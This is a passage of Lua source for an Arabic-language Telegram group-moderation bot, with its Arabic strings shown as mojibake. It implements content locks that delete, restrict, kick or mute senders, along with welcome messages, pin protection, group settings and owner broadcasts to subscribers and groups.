Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:Link"..msg.chat_id_) == "ktm" and not Special(msg) then
database:sadd(bot_id.."Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessagePhoto" and not Special(msg) then 
if database:get(bot_id.."Lock:Photo"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:Photo"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:Photo"..msg.chat_id_) == "kick" then
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:Photo"..msg.chat_id_) == "ktm" then
database:sadd(bot_id.."Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageVideo" and not Special(msg) then 
if database:get(bot_id.."Lock:Video"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:Video"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:Video"..msg.chat_id_) == "kick" then
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:Video"..msg.chat_id_) == "ktm" then
database:sadd(bot_id.."Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageAnimation" and not Special(msg) then 
if database:get(bot_id.."Lock:Animation"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:Animation"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:Animation"..msg.chat_id_) == "kick" then
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:Animation"..msg.chat_id_) == "ktm" then
database:sadd(bot_id.."Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.game_ and not Special(msg) then 
if database:get(bot_id.."Lock:geam"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:geam"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:geam"..msg.chat_id_) == "kick" then
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:geam"..msg.chat_id_) == "ktm" then
database:sadd(bot_id.."Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageAudio" and not Special(msg) then 
if database:get(bot_id.."Lock:Audio"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:Audio"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:Audio"..msg.chat_id_) == "kick" then
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:Audio"..msg.chat_id_) == "ktm" then
database:sadd(bot_id.."Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageVoice" and not Special(msg) then 
if database:get(bot_id.."Lock:vico"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:vico"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:vico"..msg.chat_id_) == "kick" then
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:vico"..msg.chat_id_) == "ktm" then
database:sadd(bot_id.."Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.reply_markup_ and msg.reply_markup_.ID == "ReplyMarkupInlineKeyboard" and not Special(msg) then 
if database:get(bot_id.."Lock:Keyboard"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:Keyboard"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:Keyboard"..msg.chat_id_) == "kick" then
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:Keyboard"..msg.chat_id_) == "ktm" then
database:sadd(bot_id.."Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageSticker" and not Special(msg) then 
if database:get(bot_id.."Lock:Sticker"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:Sticker"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:Sticker"..msg.chat_id_) == "kick" then
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:Sticker"..msg.chat_id_) == "ktm" then
database:sadd(bot_id.."Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.forward_info_ and not Special(msg) then 
if database:get(bot_id.."Lock:forward"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
elseif database:get(bot_id.."Lock:forward"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
elseif database:get(bot_id.."Lock:forward"..msg.chat_id_) == "kick" then
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
elseif database:get(bot_id.."Lock:forward"..msg.chat_id_) == "ktm" then
database:sadd(bot_id.."Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageDocument" and not Special(msg) then 
if database:get(bot_id.."Lock:Document"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:Document"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:Document"..msg.chat_id_) == "kick" then
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:Document"..msg.chat_id_) == "ktm" then
database:sadd(bot_id.."Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageUnsupported" and not Special(msg) then 
if database:get(bot_id.."Lock:Unsupported"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:Unsupported"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:Unsupported"..msg.chat_id_) == "kick" then
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:Unsupported"..msg.chat_id_) == "ktm" then
database:sadd(bot_id.."Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.entities_ then 
if msg.content_.entities_[0] then 
if msg.content_.entities_[0].ID == "MessageEntityUrl" or msg.content_.entities_[0].ID == "MessageEntityTextUrl" then 
if not Special(msg) then
if database:get(bot_id.."Lock:Markdaun"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:Markdaun"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:Markdaun"..msg.chat_id_) == "kick" then
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:Markdaun"..msg.chat_id_) == "ktm" then
database:sadd(bot_id.."Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end 
end 
end
end 

if tonumber(msg.via_bot_user_id_) ~= 0 and not Special(msg) then
if database:get(bot_id.."Lock:Inlen"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:Inlen"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:Inlen"..msg.chat_id_) == "kick" then
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:Inlen"..msg.chat_id_) == "ktm" then
database:sadd(bot_id.."Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end 


--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageContact" and not Special(msg) then 
if database:get(bot_id.."Lock:Contact"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:Contact"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:Contact"..msg.chat_id_) == "kick" then
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:Contact"..msg.chat_id_) == "ktm" then
database:sadd(bot_id.."Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.text_ and not Special(msg) then 
local _nl, ctrl_ = string.gsub(text, "%c", "") 
local _nl, real_ = string.gsub(text, "%d", "") 
sens = 400 
if database:get(bot_id.."Lock:Spam"..msg.chat_id_) == "del" and string.len(msg.content_.text_) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:Spam"..msg.chat_id_) == "ked" and string.len(msg.content_.text_) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:Spam"..msg.chat_id_) == "kick" and string.len(msg.content_.text_) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
Kick_Group(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif database:get(bot_id.."Lock:Spam"..msg.chat_id_) == "ktm" and string.len(msg.content_.text_) > (sens) or ctrl_ > (sens) or real_ > (sens) then 
database:sadd(bot_id.."Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
local status_welcome = database:get(bot_id.."Chek:Welcome"..msg.chat_id_)
if status_welcome and not database:get(bot_id.."Lock:tagservr"..msg.chat_id_) then
if msg.content_.ID == "MessageChatJoinByLink" then
tdcli_function({ID = "GetUser",user_id_=msg.sender_user_id_},function(extra,result) 
local GetWelcomeGroup = database:get(bot_id.."Get:Welcome:Group"..msg.chat_id_) 
if GetWelcomeGroup then 
t = GetWelcomeGroup
else 
t = "\nβ’ ΩΩΨ±Ψͺ Ψ­Ψ¨Ω \nβ’ name \nβ’ user" 
end 
t = t:gsub("name",result.first_name_) 
t = t:gsub("user",("@"..result.username_ or "ΩΨ§ ΩΩΨ¬Ψ―")) 
send(msg.chat_id_, msg.id_,t)
end,nil) 
end 
end 
-------------------------------------------------------
if msg.content_.ID == "MessagePinMessage" then
if Creator(msg) or tonumber(msg.sender_user_id_) == tonumber(bot_id) then 
database:set(bot_id.."Pin:Id:Msg"..msg.chat_id_,msg.content_.message_id_)
else
local Msg_Pin = database:get(bot_id.."Pin:Id:Msg"..msg.chat_id_)
if Msg_Pin and database:get(bot_id.."lockpin"..msg.chat_id_) then
PinMessage(msg.chat_id_,Msg_Pin)
end
end
end
------------------------------------------------------
if msg.content_.photo_ then 
if database:get(bot_id.."Change:Chat:Photo"..msg.chat_id_..":"..msg.sender_user_id_) then 
if msg.content_.photo_.sizes_[3] then 
photo_id = msg.content_.photo_.sizes_[3].photo_.persistent_id_ 
else 
photo_id = msg.content_.photo_.sizes_[0].photo_.persistent_id_ 
end 
tdcli_function ({ID = "ChangeChatPhoto",chat_id_ = msg.chat_id_,photo_ = getInputFile(photo_id) }, function(arg,data) 
if data.code_ == 3 then
send(msg.chat_id_, msg.id_,"Ω­ ΨΉΨ°Ψ±Ψ§ Ψ§ΩΨ¨ΩΨͺ ΩΩΨ³ Ψ§Ψ―ΩΩ ΩΨ±Ψ¬Ω ΨͺΨ±ΩΩΨͺΩ ΩΨ§ΩΩΨ­Ψ§ΩΩΩ ΩΨ§Ψ­ΩΨ§") 
database:del(bot_id.."Change:Chat:Photo"..msg.chat_id_..":"..msg.sender_user_id_) 
return false end
if data.message_ == "CHAT_ADMIN_REQUIRED" then 
send(msg.chat_id_, msg.id_,"Ω­ ΩΩΨ³ ΩΨ―Ω Ψ΅ΩΨ§Ψ­ΩΨ© ΨͺΨΊΩΩΨ± ΩΨΉΩΩΩΨ§Ψͺ Ψ§ΩΩΨ¬ΩΩΨΉΩ ΩΨ±Ψ¬Ω Ψ§ΩΩΨ­Ψ§ΩΩΩ ΩΨ§Ψ­ΩΨ§") 
database:del(bot_id.."Change:Chat:Photo"..msg.chat_id_..":"..msg.sender_user_id_) 
else
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩ ΨͺΨΊΩΩΨ± Ψ΅ΩΨ±Ψ© Ψ§ΩΩΨ¬ΩΩΨΉΩ") 
end
end, nil) 
database:del(bot_id.."Change:Chat:Photo"..msg.chat_id_..":"..msg.sender_user_id_) 
end 
end
--------------------------------------------------------------------------------------------------------------
if database:get(bot_id.."Set:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text == "Ψ§ΩΨΊΨ§Ψ‘" then 
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ ΩΨΆΨΉ Ψ§ΩΩΨ΅Ω") 
database:del(bot_id.."Set:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_)
return false 
end 
database:del(bot_id.."Set:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_) 
https.request("https://api.telegram.org/bot"..token.."/setChatDescription?chat_id="..msg.chat_id_.."&description="..text) 
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩ ΨͺΨΊΩΩΨ± ΩΨ΅Ω Ψ§ΩΩΨ¬ΩΩΨΉΩ") 
return false 
end 
--------------------------------------------------------------------------------------------------------------
if database:get(bot_id.."Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text == "Ψ§ΩΨΊΨ§Ψ‘" then 
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ­ΩΨΈ Ψ§ΩΨͺΨ±Ψ­ΩΨ¨") 
database:del(bot_id.."Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_) 
return false 
end 
database:del(bot_id.."Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_) 
database:set(bot_id.."Get:Welcome:Group"..msg.chat_id_,text) 
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩ Ψ­ΩΨΈ ΨͺΨ±Ψ­ΩΨ¨ Ψ§ΩΩΨ¬ΩΩΨΉΩ") 
return false 
end
--------------------------------------------------------------------------------------------------------------
if database:get(bot_id.."Set:Priovate:Group:Link"..msg.chat_id_..""..msg.sender_user_id_) then
if text == 'Ψ§ΩΨΊΨ§Ψ‘' then
send(msg.chat_id_,msg.id_,"Ω­ ΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ­ΩΨΈ Ψ§ΩΨ±Ψ§Ψ¨Ψ·")
database:del(bot_id.."Set:Priovate:Group:Link"..msg.chat_id_..""..msg.sender_user_id_) 
return false
end
if text and text:match("(https://telegram.me/joinchat/%S+)") or text and text:match("(https://t.me/joinchat/%S+)") then     
local Link = text:match("(https://telegram.me/joinchat/%S+)") or text and text:match("(https://t.me/joinchat/%S+)")   
database:set(bot_id.."Private:Group:Link"..msg.chat_id_,Link)
send(msg.chat_id_,msg.id_,"Ω­ ΨͺΩ Ψ­ΩΨΈ Ψ§ΩΨ±Ψ§Ψ¨Ψ· Ψ¨ΩΨ¬Ψ§Ψ­")
database:del(bot_id.."Set:Priovate:Group:Link"..msg.chat_id_..""..msg.sender_user_id_) 
return false 
end
end 

if database:get(bot_id.."Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == "Ψ§ΩΨΊΨ§Ψ‘" or text == "Ψ§ΩΨΊΨ§Ψ‘" then 
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ ΩΩΨ?Ψ§Ψ΅") 
database:del(bot_id.."Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
local list = database:smembers(bot_id..'UsersBot') 
if msg.content_.text_ then
for k,v in pairs(list) do 
send(v, 0,"["..msg.content_.text_.."]") 
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(list) do 
sendPhoto(v, 0, photo,(msg.content_.caption_ or ""))
end 
elseif msg.content_.animation_ then
for k,v in pairs(list) do 
sendDocument(v, 0, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or "")) 
end 
elseif msg.content_.sticker_ then
for k,v in pairs(list) do 
sendSticker(v, 0, msg.content_.sticker_.sticker_.persistent_id_) 
end 
end
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩΨͺ Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ Ψ§ΩΩ *~ "..#list.." ~* ΩΨ΄ΨͺΨ±Ω ΩΩ Ψ§ΩΨ?Ψ§Ψ΅ ") 
database:del(bot_id.."Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end

if database:get(bot_id.."Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == "Ψ§ΩΨΊΨ§Ψ‘" or text == "Ψ§ΩΨΊΨ§Ψ‘" then 
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ") 
database:del(bot_id.."Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
local list = database:smembers(bot_id.."Chek:Groups") 
if msg.content_.text_ then
for k,v in pairs(list) do 
send(v, 0,"["..msg.content_.text_.."]") 
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(list) do 
sendPhoto(v, 0, photo,(msg.content_.caption_ or ""))
end 
elseif msg.content_.animation_ then
for k,v in pairs(list) do 
sendDocument(v, 0, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or "")) 
end 
elseif msg.content_.sticker_ then
for k,v in pairs(list) do 
sendSticker(v, 0, msg.content_.sticker_.sticker_.persistent_id_) 
end 
end
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩΨͺ Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ Ψ§ΩΩ *~ "..#list.." ~* ΩΨ¬ΩΩΨΉΩ ") 
database:del(bot_id.."Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end

if database:get(bot_id.."Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == "Ψ§ΩΨΊΨ§Ψ‘" or text == "Ψ§ΩΨΊΨ§Ψ‘" then 
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ") 
database:del(bot_id.."Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false 
end 
if msg.forward_info_ then 
local list = database:smembers(bot_id.."Chek:Groups") 
for k,v in pairs(list) do 
tdcli_function({ID="ForwardMessages",
chat_id_ = v,
from_chat_id_ = msg.chat_id_,
message_ids_ = {[0] = msg.id_},
disable_notification_ = 0,
from_background_ = 1},function(a,t) end,nil) 
end 
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩΨͺ Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ Ψ§ΩΩ *~ "..#list.." ~* ΩΨ¬ΩΩΨΉΩ ") 
database:del(bot_id.."Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end 
return false
end
if database:get(bot_id.."Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == "Ψ§ΩΨΊΨ§Ψ‘" or text == "Ψ§ΩΨΊΨ§Ψ‘" then 
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ") 
database:del(bot_id.."Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false 
end 
if msg.forward_info_ then 
local list = database:smembers(bot_id.."UsersBot") 
for k,v in pairs(list) do 
tdcli_function({ID="ForwardMessages",
chat_id_ = v,
from_chat_id_ = msg.chat_id_,
message_ids_ = {[0] = msg.id_},
disable_notification_ = 0,
from_background_ = 1},function(a,t) end,nil) 
end 
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩΨͺ Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ Ψ§ΩΩ *~ "..#list.." ~* ΩΨ΄ΨͺΨ±Ω ΩΩ Ψ§ΩΨ?Ψ§Ψ΅ ") 
database:del(bot_id.."Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end 
return false
end
---------
if text and not Special(msg) then 
local Tshake_Msg = database:get(bot_id.."Mahmoud1:Add:Filter:Rp2"..text..msg.chat_id_) 
if Tshake_Msg then 
Reply_Status(msg,msg.sender_user_id_,"reply","Ω­ "..Tshake_Msg) 
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false
end
end
--------------------------------------------------------------------------------------------------------------
if database:get(bot_id.."Set:Name:Bot"..msg.sender_user_id_) then 
if text == "Ψ§ΩΨΊΨ§Ψ‘" or text == "Ψ§ΩΨΊΨ§Ψ‘" then 
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ­ΩΨΈ Ψ§Ψ³Ω Ψ§ΩΨ¨ΩΨͺ") 
database:del(bot_id.."Set:Name:Bot"..msg.sender_user_id_) 
return false 
end 
database:del(bot_id.."Set:Name:Bot"..msg.sender_user_id_) 
database:set(bot_id.."Name:Bot",text) 
send(msg.chat_id_, msg.id_, "Ω­ ΨͺΩ Ψ­ΩΨΈ Ψ§Ψ³Ω Ψ§ΩΨ¨ΩΨͺ") 
return false
end 
if text and database:get(bot_id.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
database:set(bot_id.."Set:Cmd:Group:New"..msg.chat_id_,text)
send(msg.chat_id_, msg.id_,"Ω­ Ψ§Ψ±Ψ³Ω Ψ§ΩΨ§ΩΨ± Ψ§ΩΨ¬Ψ―ΩΨ―") 
database:del(bot_id.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
database:set(bot_id.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_,"true1") 
return false
end
if text and database:get(bot_id.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_) == "true1" then
local NewCmd = database:get(bot_id.."Set:Cmd:Group:New"..msg.chat_id_)
database:set(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text,NewCmd)
database:sadd(bot_id.."List:Cmd:Group:New"..msg.chat_id_,text)
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩ Ψ­ΩΨΈ Ψ§ΩΨ§ΩΨ±") 
database:del(bot_id.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'GroupBot' then
if ChekAdd(msg.chat_id_) == true then
if text == "ΩΩΩ Ψ§ΩΨ―Ψ±Ψ―Ψ΄Ω" and msg.reply_to_message_id_ == 0 and Manger(msg) then 
database:set(bot_id.."Lock:text"..msg.chat_id_,true) 
Reply_Status(msg,msg.sender_user_id_,"lock","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΨ―Ψ±Ψ―Ψ΄Ω") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ§ΨΆΨ§ΩΩ" and msg.reply_to_message_id_ == 0 and Admin(msg) then 
database:set(bot_id.."Lock:AddMempar"..msg.chat_id_,"kick") 
Reply_Status(msg,msg.sender_user_id_,"lock","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΨΆΨ§ΩΨ© Ψ§ΩΨ§ΨΉΨΆΨ§Ψ‘") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ―Ψ?ΩΩ" and msg.reply_to_message_id_ == 0 and Admin(msg) then 
database:set(bot_id.."Lock:Join"..msg.chat_id_,"kick") 
Reply_Status(msg,msg.sender_user_id_,"lock","Ω­ ΨͺΩ ΩΩΩΩ Ψ―Ψ?ΩΩ Ψ§ΩΨ§ΨΉΨΆΨ§Ψ‘") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ" and msg.reply_to_message_id_ == 0 and Admin(msg) then 
database:set(bot_id.."Lock:Bot:kick"..msg.chat_id_,"del") 
Reply_Status(msg,msg.sender_user_id_,"lock","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ Ψ¨Ψ§ΩΨ·Ψ±Ψ―" and msg.reply_to_message_id_ == 0 and Admin(msg) then 
database:set(bot_id.."Lock:Bot:kick"..msg.chat_id_,"kick") 
Reply_Status(msg,msg.sender_user_id_,"lockkick","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ§Ψ΄ΨΉΨ§Ψ±Ψ§Ψͺ" and msg.reply_to_message_id_ == 0 and Admin(msg) then 
